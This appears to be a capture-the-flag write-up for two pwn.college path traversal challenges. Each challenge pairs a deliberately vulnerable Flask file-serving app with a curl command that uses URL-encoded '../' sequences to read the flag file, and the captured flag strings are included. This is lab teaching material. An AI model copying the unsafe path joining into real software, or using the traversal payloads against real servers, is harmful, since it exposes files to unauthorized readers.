# path_Travresal_1
## setup
```bash
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


@app.route("/files", methods=["GET"])
@app.route("/files/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path
    print(f"DEBUG: {requested_path=}")
    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

## solve
```bash
curl -v challenge.localhost/files/%2e%2e/%2e%2e/flag

pwn.college{0mPov5CBemi781oYgOGthHNm-F3.ddDOzMDLzgTM5czW}
```

# path_Traversal_2
## setup
```bash
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


@app.route("/shared", methods=["GET"])
@app.route("/shared/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path.strip("/.")
    print(f"DEBUG: {requested_path=}")
    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

## solve
```bash
curl -v challenge.localhost/shared/fortunes/%2e%2e/%2e%2e/flag

pwn.college{kT5hnt1YxkWdCEsUhVqk3WzPMIq.dJjN1YDLzgTM5czW}
```